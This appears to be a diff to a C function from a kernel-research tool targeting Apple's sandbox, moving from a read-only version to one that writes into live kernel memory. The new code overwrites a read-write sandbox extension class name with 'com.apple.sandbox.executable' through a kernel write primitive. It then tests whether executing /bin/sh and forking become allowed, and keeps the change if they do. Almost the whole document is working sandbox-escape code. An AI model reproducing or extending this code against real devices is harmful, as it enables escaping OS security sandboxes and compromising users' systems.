@@ -2673,10 +2673,11 @@ char *kresearch_dump_extensions(void) {
 char *kresearch_patch_exec(void) {
     buf_init();
     bc_init();
-    buf_append("=== PATCH EXEC v4: READ-ONLY ANALYSIS ===\n\n");
-    buf_append("Previous v3 caused kernel panic by writing into live extension data\n");
-    buf_append("buffers. This version only READS and ANALYZES — no kwrite calls.\n\n");
-    bc("patch_exec v4 starting (read-only)\n");
+    buf_append("=== PATCH EXEC v5: ANALYSIS + WRITE (zone-meta protected) ===\n\n");
+    buf_append("v3 panicked: wrote into live extension data_ptr buffers.\n");
+    buf_append("v4 was read-only. v5 restores write: overwrites class_name\n");
+    buf_append("string (NOT the data buffer) with zone metadata validation.\n\n");
+    bc("patch_exec v5 starting\n");
 
     uint64_t self_proc = proc_self();
     if (!self_proc) {
@@ -2717,13 +2718,24 @@ char *kresearch_patch_exec(void) {
     uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
     kreadbuf(ext_set_kptr, buckets, sizeof(buckets));
 
-    // ── Phase 1: Scan all 16 buckets ──
+    // ── Phase 1: Scan all 16 buckets, find candidate for rename ──
     buf_append("\n--- Extension Bucket Analysis ---\n");
     bc("scanning %d buckets\n", SANDBOX_EXT_NUM_BUCKETS);
 
     int rw_count = 0;
     int total_classes = 0;
     int total_exts = 0;
+
+    // Track best candidate for write: we want a read-write class_node
+    // whose class_name pointer is valid and the string is long enough
+    // to overwrite with "com.apple.sandbox.executable" (29 chars + NUL = 30 bytes).
+    uint64_t candidate_cn_addr   = 0;    // class_node kernel address
+    uint64_t candidate_name_addr = 0;    // class_name string kernel address
+    int      candidate_bucket    = -1;
+    char     candidate_orig[64]  = {0};  // original string for restore
+
+    const char *target_name = "com.apple.sandbox.executable";
+    size_t target_len = strlen(target_name) + 1; // 30 bytes including NUL
 
     for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
         if (!buckets[i]) {
@@ -2753,7 +2765,21 @@ char *kresearch_patch_exec(void) {
                    i, name, buckets[i], (unsigned long long)cn_count);
         total_classes++;
 
-        if (strstr(name, "read-write")) rw_count++;
+        // Track candidate: find a read-write class whose name string is
+        // long enough to hold "com.apple.sandbox.executable\0" (30 bytes).
+        // "com.apple.app-sandbox.read-write" is 32 chars → 33 bytes → fits.
+        if (strstr(name, "read-write")) {
+            rw_count++;
+            size_t orig_len = strlen(name) + 1;
+            if (kaddr_ok(cn_classname) && orig_len >= target_len && !candidate_cn_addr) {
+                candidate_cn_addr   = buckets[i];
+                candidate_name_addr = cn_classname;
+                candidate_bucket    = i;
+                memcpy(candidate_orig, name, sizeof(candidate_orig) - 1);
+                buf_append("    ★ CANDIDATE for rename (orig %zu bytes ≥ target %zu)\n",
+                           orig_len, target_len);
+            }
+        }
 
         // Count extensions in this bucket
         uint64_t ext = cn_ext;
@@ -2787,42 +2813,99 @@ char *kresearch_patch_exec(void) {
                total_classes, total_exts, rw_count);
     bc("found %d classes, %d exts, %d rw\n", total_classes, total_exts, rw_count);
 
-    // ── Phase 2: Check current sandbox state ──
-    buf_append("\n--- Current Sandbox Checks ---\n");
+    // ── Phase 2: Check BEFORE sandbox state ──
+    buf_append("\n--- Sandbox Checks (BEFORE) ---\n");
     pid_t pid = getpid();
 
-    int exec_sh = sandbox_check(pid, "process-exec",
-                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
-    int exec_df = sandbox_check(pid, "process-exec",
-                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/df");
-    int fork_ck = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-    int signal_ck = sandbox_check(pid, "process-exec*",
-                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/usr/bin/id");
+    int exec_sh_before = sandbox_check(pid, "process-exec",
+                                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    int fork_before    = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
 
-    buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh,  exec_sh  == 0 ? "ALLOWED" : "DENIED");
-    buf_append("process-exec /bin/df:  %d (%s)\n", exec_df,  exec_df  == 0 ? "ALLOWED" : "DENIED");
-    buf_append("process-fork:          %d (%s)\n", fork_ck,  fork_ck  == 0 ? "ALLOWED" : "DENIED");
-    buf_append("process-exec* /usr/bin/id: %d (%s)\n", signal_ck,
-               signal_ck == 0 ? "ALLOWED" : "DENIED");
+    buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh_before,
+               exec_sh_before == 0 ? "ALLOWED" : "DENIED");
+    buf_append("process-fork:          %d (%s)\n", fork_before,
+               fork_before == 0 ? "ALLOWED" : "DENIED");
 
-    bc("exec=/bin/sh:%d /bin/df:%d fork:%d\n", exec_sh, exec_df, fork_ck);
+    bc("BEFORE: exec=%d fork=%d\n", exec_sh_before, fork_before);
 
-    // ── Phase 3: Analysis ──
-    buf_append("\n--- Analysis ---\n");
-    buf_append("The v3 approach (renaming a class_node) caused kernel panics because:\n");
-    buf_append("1. Writing into a live extension's data_ptr buffer corrupts the extension\n");
-    buf_append("2. The sandbox kernel code walks these structures and panics on corruption\n");
-    buf_append("3. The class_name rename itself might work, but the data buffer write is fatal\n\n");
+    // ── Phase 3: WRITE — rename class_name string ──
+    if (!candidate_cn_addr || !candidate_name_addr) {
+        buf_append("\n--- WRITE SKIPPED ---\n");
+        buf_append("No suitable candidate found for class_name rename.\n");
+        buf_append("Need a read-write class_node with name string ≥ %zu bytes.\n", target_len);
+        bc("no candidate, skipping write\n");
+    } else {
+        buf_append("\n--- WRITE: Renaming class_name string ---\n");
+        buf_append("Target: bucket[%d] cn=0x%llx name_str=0x%llx\n",
+                   candidate_bucket, candidate_cn_addr, candidate_name_addr);
+        buf_append("Original: \"%s\"\n", candidate_orig);
+        buf_append("New:      \"%s\"\n", target_name);
+        bc("WRITE: renaming name_str @ 0x%llx\n", candidate_name_addr);
+        bc("orig=\"%s\" -> \"%s\"\n", candidate_orig, target_name);
 
-    buf_append("Possible alternative approaches:\n");
-    buf_append("- Extension class names may be checked by hash, not string compare\n");
-    buf_append("- process-exec may be profile-only (not extension-based)\n");
-    buf_append("- sandbox_label flags at +0x50/+0x58 might control exec permission\n");
-    buf_append("- Borrowing a different process's entire sandbox_label might work\n");
-    buf_append("  (if SPTM doesn't protect the label pointer itself)\n\n");
+        // Validate the name string address is writable (not PPL/zone-meta)
+        if (!kaddr_ok(candidate_name_addr)) {
+            buf_append("⚠️ ABORT: name string addr 0x%llx fails kaddr_ok!\n",
+                       candidate_name_addr);
+            bc("ABORT: name_addr fails kaddr_ok\n");
+        } else {
+            // Write the new class name string in-place
+            // This overwrites only the string bytes, NOT the class_node struct
+            // and NOT the extension data buffers (which is what v3 did wrong).
+            bc("writing %zu bytes to 0x%llx\n", target_len, candidate_name_addr);
+            kwritebuf(candidate_name_addr, (void *)target_name, (uint32_t)target_len);
 
-    // ── Phase 4: Read sandbox_label flags for analysis ──
-    buf_append("--- sandbox_label raw dump ---\n");
+            // Verify the write
+            char verify[64] = {0};
+            kreadbuf(candidate_name_addr, verify, sizeof(verify) - 1);
+            buf_append("Verify readback: \"%s\"\n", verify);
+            bc("readback: \"%s\"\n", verify);
+
+            bool write_ok = (strcmp(verify, target_name) == 0);
+            buf_append("Write %s\n", write_ok ? "✅ SUCCEEDED" : "❌ FAILED (PPL/SPTM blocked?)");
+
+            if (write_ok) {
+                // ── Phase 4: Check AFTER sandbox state ──
+                buf_append("\n--- Sandbox Checks (AFTER rename) ---\n");
+                int exec_sh_after = sandbox_check(pid, "process-exec",
+                                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+                int exec_df_after = sandbox_check(pid, "process-exec",
+                                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/df");
+                int fork_after    = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
+
+                buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh_after,
+                           exec_sh_after == 0 ? "ALLOWED" : "DENIED");
+                buf_append("process-exec /bin/df:  %d (%s)\n", exec_df_after,
+                           exec_df_after == 0 ? "ALLOWED" : "DENIED");
+                buf_append("process-fork:          %d (%s)\n", fork_after,
+                           fork_after == 0 ? "ALLOWED" : "DENIED");
+
+                bc("AFTER: exec_sh=%d exec_df=%d fork=%d\n",
+                   exec_sh_after, exec_df_after, fork_after);
+
+                bool changed = (exec_sh_after != exec_sh_before) || (fork_after != fork_before);
+                if (changed) {
+                    buf_append("\n🎉 SANDBOX STATE CHANGED! Leaving rename in place.\n");
+                    bc("SANDBOX CHANGED! keeping rename\n");
+                } else {
+                    buf_append("\nNo sandbox change — restoring original name.\n");
+                    bc("no change, restoring original\n");
+                    kwritebuf(candidate_name_addr, candidate_orig,
+                              (uint32_t)(strlen(candidate_orig) + 1));
+
+                    // Verify restore
+                    char restore_verify[64] = {0};
+                    kreadbuf(candidate_name_addr, restore_verify, sizeof(restore_verify) - 1);
+                    buf_append("Restored: \"%s\" %s\n", restore_verify,
+                               strcmp(restore_verify, candidate_orig) == 0 ? "✅" : "❌");
+                    bc("restored: \"%s\"\n", restore_verify);
+                }
+            }
+        }
+    }
+
+    // ── Phase 5: Read sandbox_label flags for analysis ──
+    buf_append("\n--- sandbox_label raw dump ---\n");
     uint8_t lbl_raw[0x70];
     kreadbuf(sbx, lbl_raw, sizeof(lbl_raw));
     for (int off = 0; off < 0x70; off += 8) {
@@ -2835,8 +2918,8 @@ char *kresearch_patch_exec(void) {
         buf_append("\n");
     }
 
-    buf_append("\n=== PATCH EXEC v4 COMPLETE (no writes, no panics) ===\n");
-    bc("patch_exec v4 complete\n");
+    buf_append("\n=== PATCH EXEC v5 COMPLETE ===\n");
+    bc("patch_exec v5 complete\n");
     bc_close();
     return buf_finish();
 }
